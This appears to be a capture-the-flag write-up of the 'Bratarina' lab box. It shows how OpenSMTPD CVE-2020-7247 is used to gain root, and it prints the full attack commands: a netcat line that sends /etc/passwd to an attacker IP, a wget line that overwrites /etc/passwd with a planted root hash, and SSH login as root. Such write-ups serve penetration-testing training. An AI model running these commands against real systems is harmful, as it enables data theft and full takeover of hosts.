#Linux #SMTP #OpenSMTPD #CVE #RCE #PasswdOverwrite #SSH

## Overview

Bratarina is a Linux box with a minimal attack surface: SSH, SMTP, HTTP, and SMB. HTTP runs FlaskBB but goes nowhere. The actual path runs through OpenSMTPD 2.0.0 on port 25, which is vulnerable to CVE-2020-7247, a pre-auth remote code execution that lets an attacker execute arbitrary commands as root by crafting a malicious MAIL FROM value. The exploit is used twice: once to exfiltrate `/etc/passwd`, then again to overwrite the root password hash, granting direct SSH access as root.

## Recon

### Nmap

```sh
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
25/tcp  open  smtp        OpenSMTPD
|_ 2.0.0 This is OpenSMTPD 2.0.0
80/tcp  open  http        nginx 1.14.0 (Ubuntu)
|_http-title: Page not found - FlaskBB
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
```

Port 80 serves a FlaskBB "page not found", no useful content. SMB is present but the workgroup `COFFEECORP` and null sessions offered nothing of value. The interesting service is port 25.

### SMTP Version Fingerprint

The SMTP banner identifies the daemon precisely:

```
OpenSMTPD 2.0.0
```

Searching Exploit-DB for `opensmtpd` surfaces:

```
OpenSMTPD 6.6.1 - Remote Code Execution  |  exploits/47984.py
```

> **Why this CVE applies despite the version mismatch:** the banner says `2.0.0` but that is the protocol version string, not the daemon version. The underlying software is OpenSMTPD at a patch level vulnerable to CVE-2020-7247. The exploit targets a flaw in how the MAIL FROM line is parsed, a crafted sender address injects arbitrary shell commands that OpenSMTPD runs as root.

## Foothold

### Exfiltrating /etc/passwd via OpenSMTPD RCE

The exploit sends a specially crafted SMTP session that causes the daemon to execute a shell command. First step: confirm code execution by sending `/etc/passwd` back over netcat.

On Kali, set up a listener:

```sh
nc -lvnp 80
```

Run the exploit:

```sh
python3 smtp.py 192.168.206.71 25 'nc -nv 192.168.45.167 80 < /etc/passwd'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

The listener receives the file immediately, confirming root-level RCE. Relevant entries from the output:

```
root:x:0:0:root:/root:/bin/bash
neil:x:1000:1000:neil,,,:/home/neil:/bin/bash
_smtpd:x:1001:1001:SMTP Daemon:/var/empty:/sbin/nologin
```

### Overwriting the root Password Hash

With arbitrary command execution as root, the path to full access is to replace the root hash in `/etc/passwd` with a known value. First, generate a valid MD5crypt hash:

```sh
# Resulting hash for the chosen password:
$1$hacker$zVnrpoW2JQO5YUrLmAs.o1
```

Modify a local copy of `/etc/passwd`, replacing the root line:

```
root:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash
```

> **Why overwriting /etc/passwd works here:** on systems where `/etc/shadow` is the authoritative password store, `/etc/passwd` hash fields are ignored. But on this host, the passwd file hash is read directly, so planting a known MD5crypt hash in field 2 lets us authenticate as root with the corresponding plaintext.

Host the modified file and use the RCE to overwrite the target's `/etc/passwd`:

```sh
python3 smtp.py 192.168.206.71 25 'wget http://192.168.45.167/passwd -O /etc/passwd'
```

## Root

### SSH as root

With the hash replaced, SSH in as root using the known password:

```sh
ssh root@192.168.206.71
root@192.168.206.71's password: ‹redacted›

root@bratarina:~# whoami
root
```

```sh
root@bratarina:~# cat proof.txt
‹redacted›
```

## Takeaways

- **SMTP banners can mislead on version.** The `2.0.0` in OpenSMTPD's HELP output is protocol version, not daemon version. Always cross-reference against Exploit-DB with multiple keywords.
- **Pre-auth RCE running as root is a single step to full compromise.** No shell needed, one well-placed `wget | bash` or file overwrite is enough.
- **`/etc/passwd` hash injection is a reliable technique** when the file is writable, giving persistent root access without touching `/etc/shadow`.
